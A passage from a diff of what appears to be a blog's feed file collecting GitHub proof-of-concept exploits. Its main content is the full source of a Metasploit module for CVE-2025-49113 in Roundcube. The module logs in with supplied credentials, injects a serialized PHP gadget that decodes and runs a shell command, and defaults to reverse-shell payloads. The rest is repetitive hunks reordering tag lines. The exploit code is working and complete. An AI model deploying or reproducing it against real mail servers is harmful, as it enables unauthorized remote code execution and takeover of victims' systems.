https://github.com/rapid7/metasploit-framework</span><br><span class="hljs-comment">##</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetasploitModule</span> &lt; <span class="hljs-title class_ inherited__">Msf::Exploit::Remote</span><br>  <span class="hljs-title class_">Rank</span> = <span class="hljs-title class_">ExcellentRanking</span><br><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::Remote::HttpClient</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::FileDropper</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-title class_">Msf::Exploit::CmdStager</span><br>  <span class="hljs-keyword">prepend</span> <span class="hljs-title class_">Msf</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Exploit</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Remote</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:AutoCheck</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">info = &#123;&#125;</span>)<br>    <span class="hljs-variable language_">super</span>(<br>      update_info(<br>        info,<br>        <span class="hljs-string">&#x27;Name&#x27;</span> =&gt; <span class="hljs-string">&#x27;Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization&#x27;</span>,<br>        <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">%q&#123;</span><br><span class="hljs-string">          Roundcube Webmail before 1.5.10 and 1.6.x before 1.6.11 allows remote code execution</span><br><span class="hljs-string">          by authenticated users because the _from parameter in a URL is not validated</span><br><span class="hljs-string">          in program/actions/settings/upload.php, leading to PHP Object Deserialization.</span><br><span class="hljs-string"></span><br><span class="hljs-string">          An attacker can execute arbitrary system commands as the web server.</span><br><span class="hljs-string">        &#125;</span>,<br>        <span class="hljs-string">&#x27;Author&#x27;</span> =&gt; [<br>          <span class="hljs-string">&#x27;Maksim Rogov&#x27;</span>, <span class="hljs-comment"># msf module</span><br>          <span class="hljs-string">&#x27;Kirill Firsov&#x27;</span>, <span class="hljs-comment"># disclosure and original exploit</span><br>        ],<br>        <span class="hljs-string">&#x27;License&#x27;</span> =&gt; <span class="hljs-variable constant_">MSF_LICENSE</span>,<br>        <span class="hljs-string">&#x27;References&#x27;</span> =&gt; [<br>          [<span class="hljs-string">&#x27;CVE&#x27;</span>, <span class="hljs-string">&#x27;2025-49113&#x27;</span>],<br>          [<span class="hljs-string">&#x27;URL&#x27;</span>, <span class="hljs-string">&#x27;https://fearsoff.org/research/roundcube&#x27;</span>]<br>        ],<br>        <span class="hljs-string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="hljs-string">&#x27;2025-06-02&#x27;</span>,<br>        <span class="hljs-string">&#x27;Notes&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;Stability&#x27;</span> =&gt; [<span class="hljs-variable constant_">CRASH_SAFE</span>],<br>          <span class="hljs-string">&#x27;SideEffects&#x27;</span> =&gt; [<span class="hljs-variable constant_">IOC_IN_LOGS</span>],<br>          <span class="hljs-string">&#x27;Reliability&#x27;</span> =&gt; [<span class="hljs-variable constant_">REPEATABLE_SESSION</span>]<br>        &#125;,<br>        <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [<span class="hljs-string">&#x27;unix&#x27;</span>, <span class="hljs-string">&#x27;linux&#x27;</span>],<br>        <span class="hljs-string">&#x27;Targets&#x27;</span> =&gt; [<br>          [<br>            <span class="hljs-string">&#x27;Linux Dropper&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; <span class="hljs-string">&#x27;linux&#x27;</span>,<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [<span class="hljs-variable constant_">ARCH_X64</span>, <span class="hljs-variable constant_">ARCH_X86</span>, <span class="hljs-variable constant_">ARCH_ARMLE</span>, <span class="hljs-variable constant_">ARCH_AARCH64</span>],<br>              <span class="hljs-string">&#x27;Type&#x27;</span> =&gt; <span class="hljs-symbol">:linux_dropper</span>,<br>              <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;linux/x64/meterpreter/reverse_tcp&#x27;</span> &#125;<br>            &#125;<br>          ],<br>          [<br>            <span class="hljs-string">&#x27;Linux Command&#x27;</span>,<br>            &#123;<br>              <span class="hljs-string">&#x27;Platform&#x27;</span> =&gt; [<span class="hljs-string">&#x27;unix&#x27;</span>, <span class="hljs-string">&#x27;linux&#x27;</span>],<br>              <span class="hljs-string">&#x27;Arch&#x27;</span> =&gt; [<span class="hljs-variable constant_">ARCH_CMD</span>],<br>              <span class="hljs-string">&#x27;Type&#x27;</span> =&gt; <span class="hljs-symbol">:nix_cmd</span>,<br>              <span class="hljs-string">&#x27;DefaultOptions&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;PAYLOAD&#x27;</span> =&gt; <span class="hljs-string">&#x27;cmd/unix/reverse_bash&#x27;</span> &#125;<br>            &#125;<br>          ]<br>        ],<br>        <span class="hljs-string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="hljs-number">0</span><br>      )<br>      )<br><br>    register_options(<br>      [<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;USERNAME&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Email User to login with&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span> ]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;PASSWORD&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;Password to login with&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span> ]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;TARGETURI&#x27;</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;The URI of the Roundcube Application&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span> ]),<br>        <span class="hljs-title class_">OptString</span>.new(<span class="hljs-string">&#x27;HOST&#x27;</span>, [<span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;The hostname of Roundcube server&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>]),<br>        <span class="hljs-title class_">OptInt</span>.new(<span class="hljs-string">&#x27;TIMEOUT&#x27;</span>, [<span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;Time to wait for session (in seconds)&#x27;</span>, <span class="hljs-number">3</span> ])<br>      ]<br>    )<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">PhpPayloadBuilder</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">command</span>)<br>      <span class="hljs-variable">@encoded</span> = <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.encode_base32(command)<br>      <span class="hljs-variable">@gpgconf</span> = <span class="hljs-string">%(echo &quot;<span class="hljs-subst">#&#123;<span class="hljs-variable">@encoded</span>&#125;</span>&quot;|base32 -d|sh;#)</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">build</span><br>      len = <span class="hljs-variable">@gpgconf</span>.bytesize<br>      <span class="hljs-string">%(|O:16:&quot;Crypt_GPG_Engine&quot;:3:&#123;s:8:&quot;_process&quot;;b:0;s:8:&quot;_gpgconf&quot;;s:<span class="hljs-subst">#&#123;len&#125;</span>:&quot;<span class="hljs-subst">#&#123;<span class="hljs-variable">@gpgconf</span>&#125;</span>&quot;;s:8:&quot;_homedir&quot;;s:0:&quot;&quot;;&#125;;)</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_login_page</span><br>    res = send_request_cgi(<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;_task&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span> &#125;<br>    )<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unreachable</span>, <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;peer&#125;</span> - No response from web service&quot;</span>) <span class="hljs-keyword">unless</span> res<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;peer&#125;</span> - Unexpected HTTP code <span class="hljs-subst">#&#123;res.code&#125;</span>&quot;</span>) <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">200</span><br>    res<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span><br>    res = fetch_login_page<br><br>    <span class="hljs-keyword">unless</span> res.body =~ <span class="hljs-regexp">/&quot;rcversion&quot;\s*:\s*(\d+)/</span><br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;peer&#125;</span> - Unable to extract version number&quot;</span>)<br>    <span class="hljs-keyword">end</span><br><br>    version = <span class="hljs-title class_">Rex::Version</span>.new(<span class="hljs-title class_">Regexp</span>.last_match(<span class="hljs-number">1</span>).to_s)<br>    print_good(<span class="hljs-string">&quot;Extracted version: <span class="hljs-subst">#&#123;version&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> version.between?(<span class="hljs-title class_">Rex::Version</span>.new(<span class="hljs-number">10100</span>), <span class="hljs-title class_">Rex::Version</span>.new(<span class="hljs-number">10509</span>))<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Appears</span><br>    <span class="hljs-keyword">elsif</span> version.between?(<span class="hljs-title class_">Rex::Version</span>.new(<span class="hljs-number">10600</span>), <span class="hljs-title class_">Rex::Version</span>.new(<span class="hljs-number">10610</span>))<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Appears</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-title class_">CheckCode</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Safe</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">build_serialized_payload</span><br>    print_status(<span class="hljs-string">&#x27;Preparing payload...&#x27;</span>)<br><br>    stager = <span class="hljs-keyword">case</span> target[<span class="hljs-string">&#x27;Type&#x27;</span>]<br>             <span class="hljs-keyword">when</span> <span class="hljs-symbol">:nix_cmd</span><br>               payload.encoded<br>             <span class="hljs-keyword">when</span> <span class="hljs-symbol">:linux_dropper</span><br>               generate_cmdstager.join(<span class="hljs-string">&#x27;;&#x27;</span>)<br>             <span class="hljs-keyword">else</span><br>               fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:BadConfig</span>, <span class="hljs-string">&#x27;Unsupported target type&#x27;</span>)<br>             <span class="hljs-keyword">end</span><br><br>    serialized = <span class="hljs-title class_">PhpPayloadBuilder</span>.new(stager).build.gsub(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\\&quot;&#x27;</span>)<br>    print_good(<span class="hljs-string">&#x27;Payload successfully generated and serialized.&#x27;</span>)<br>    serialized<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span><br>    token = fetch_csrf_token<br>    login(token)<br><br>    payload_serialized = build_serialized_payload<br>    upload_payload(payload_serialized)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_csrf_token</span><br>    print_status(<span class="hljs-string">&#x27;Fetching CSRF token...&#x27;</span>)<br><br>    res = fetch_login_page<br>    html = res.get_html_document<br><br>    token_input = html.at(<span class="hljs-string">&#x27;input[name=&quot;_token&quot;]&#x27;</span>)<br>    <span class="hljs-keyword">unless</span> token_input<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;peer&#125;</span> - Unable to extract CSRF token&quot;</span>)<br>    <span class="hljs-keyword">end</span><br><br>    token = token_input.attributes.fetch(<span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-literal">nil</span>)<br>    <span class="hljs-keyword">if</span> token.blank?<br>      fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;peer&#125;</span> - CSRF token is empty&quot;</span>)<br>    <span class="hljs-keyword">end</span><br><br>    print_good(<span class="hljs-string">&quot;Extracted token: <span class="hljs-subst">#&#123;token&#125;</span>&quot;</span>)<br>    token<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">token</span>)<br>    print_status(<span class="hljs-string">&#x27;Attempting login...&#x27;</span>)<br>    vars_post = &#123;<br>      <span class="hljs-string">&#x27;_token&#x27;</span> =&gt; token,<br>      <span class="hljs-string">&#x27;_task&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span>,<br>      <span class="hljs-string">&#x27;_action&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span>,<br>      <span class="hljs-string">&#x27;_url&#x27;</span> =&gt; <span class="hljs-string">&#x27;_task=login&#x27;</span>,<br>      <span class="hljs-string">&#x27;_user&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;USERNAME&#x27;</span>],<br>      <span class="hljs-string">&#x27;_pass&#x27;</span> =&gt; datastore[<span class="hljs-string">&#x27;PASSWORD&#x27;</span>]<br>    &#125;<br><br>    vars_post[<span class="hljs-string">&#x27;_host&#x27;</span>] = datastore[<span class="hljs-string">&#x27;HOST&#x27;</span>] <span class="hljs-keyword">if</span> datastore[<span class="hljs-string">&#x27;HOST&#x27;</span>]<br><br>    res = send_request_cgi(<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;keep_cookies&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; vars_post,<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123; <span class="hljs-string">&#x27;_task&#x27;</span> =&gt; <span class="hljs-string">&#x27;login&#x27;</span> &#125;<br>    )<br><br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Unreachable</span>, <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;peer&#125;</span> - No response during login&quot;</span>) <span class="hljs-keyword">unless</span> res<br>    fail_with(<span class="hljs-title class_">Failure</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:UnexpectedReply</span>, <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;peer&#125;</span> - Login failed (code <span class="hljs-subst">#&#123;res.code&#125;</span>)&quot;</span>) <span class="hljs-keyword">unless</span> res.code == <span class="hljs-number">302</span><br><br>    print_good(<span class="hljs-string">&#x27;Login successful.&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_from</span><br>    options = [<br>      <span class="hljs-string">&#x27;compose&#x27;</span>,<br>      <span class="hljs-string">&#x27;reply&#x27;</span>,<br>      <span class="hljs-string">&#x27;import&#x27;</span>,<br>      <span class="hljs-string">&#x27;settings&#x27;</span>,<br>      <span class="hljs-string">&#x27;folders&#x27;</span>,<br>      <span class="hljs-string">&#x27;identity&#x27;</span><br>    ]<br>    options.sample<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_id</span><br>    random_data = <span class="hljs-title class_">SecureRandom</span>.random_bytes(<span class="hljs-number">8</span>)<br>    timestamp = <span class="hljs-title class_">Time</span>.now.to_f.to_s<br>    <span class="hljs-title class_">Digest</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:MD5</span>.hexdigest(random_data + timestamp)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_uploadid</span><br>    millis = (<span class="hljs-title class_">Time</span>.now.to_f * <span class="hljs-number">1000</span>).to_i<br>    <span class="hljs-string">&quot;upload<span class="hljs-subst">#&#123;millis&#125;</span>&quot;</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_payload</span>(<span class="hljs-params">payload_filename</span>)<br>    print_status(<span class="hljs-string">&#x27;Uploading malicious payload...&#x27;</span>)<br><br>    <span class="hljs-comment"># 1x1 transparent pixel image</span><br>    png_data = <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.decode_base64(<span class="hljs-string">&#x27;iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==&#x27;</span>)<br>    boundary = <span class="hljs-title class_">Rex</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Text</span>.rand_text_alphanumeric(<span class="hljs-number">8</span>)<br><br>    data = <span class="hljs-string">&#x27;&#x27;</span><br>    data &lt;&lt; <span class="hljs-string">&quot;--<span class="hljs-subst">#&#123;boundary&#125;</span>\r\n&quot;</span><br>    data &lt;&lt; <span class="hljs-string">&quot;Content-Disposition: form-data; name=\&quot;_file[]\&quot;; filename=\&quot;<span class="hljs-subst">#&#123;payload_filename&#125;</span>\&quot;\r\n&quot;</span><br>    data &lt;&lt; <span class="hljs-string">&quot;Content-Type: image/png\r\n\r\n&quot;</span><br>    data &lt;&lt; png_data<br>    data &lt;&lt; <span class="hljs-string">&quot;\r\n--<span class="hljs-subst">#&#123;boundary&#125;</span>--\r\n&quot;</span><br><br>    send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path, <span class="hljs-string">&quot;?_task=settings&amp;_remote=1&amp;_from=edit-!<span class="hljs-subst">#&#123;generate_from&#125;</span>&amp;_id=<span class="hljs-subst">#&#123;generate_id&#125;</span>&amp;_uploadid=<span class="hljs-subst">#&#123;generate_uploadid&#125;</span>&amp;_action=upload&quot;</span>),<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&quot;multipart/form-data; boundary=<span class="hljs-subst">#&#123;boundary&#125;</span>&quot;</span>,<br>      <span class="hljs-string">&#x27;data&#x27;</span> =&gt; data<br>    &#125;, datastore[<span class="hljs-string">&#x27;TIMEOUT&#x27;</span>])<br><br>    print_good(<span class="hljs-string">&#x27;Exploit attempt complete. Check for session.&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>rapid7/metasploit-framework:github issues</tag>
+      
+      <tag>反序列化</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Roundcube Post-Auth RCE via PHP Object Deserialization</title>
     <link href="/2025/06/10/github_898314140/"/>
     <url>/2025/06/10/github_898314140/</url>
@@ -1439,9 +1520,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>缓冲区溢出</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -1628,9 +1709,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2023:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -1763,9 +1844,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2006,9 +2087,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2384,9 +2465,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2573,9 +2654,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>缓冲区溢出</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2600,9 +2681,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>缓冲区溢出</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2654,9 +2735,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2816,9 +2897,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2023:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -3221,9 +3302,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3248,9 +3329,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>缓冲区溢出</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3759,9 +3840,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3786,9 +3867,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3813,9 +3894,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4002,9 +4083,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>跨站可执行脚本</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4056,9 +4137,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4137,9 +4218,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4542,9 +4623,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>反序列化</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4569,9 +4650,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4623,9 +4704,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4650,9 +4731,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4677,9 +4758,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4704,9 +4785,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>跨站可执行脚本</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4839,9 +4920,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>缓冲区溢出</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4920,9 +5001,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4947,9 +5028,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>缓冲区溢出</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -5271,9 +5352,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -5487,9 +5568,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2023:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -5973,9 +6054,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -6000,9 +6081,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -6700,9 +6781,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -7157,9 +7238,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>反序列化</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -7745,9 +7826,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>缓冲区溢出</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -8065,9 +8146,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -8092,9 +8173,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2024:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -8219,9 +8300,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -8273,9 +8354,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -8354,9 +8435,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>跨站可执行脚本</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -8514,9 +8595,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>缓冲区溢出</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
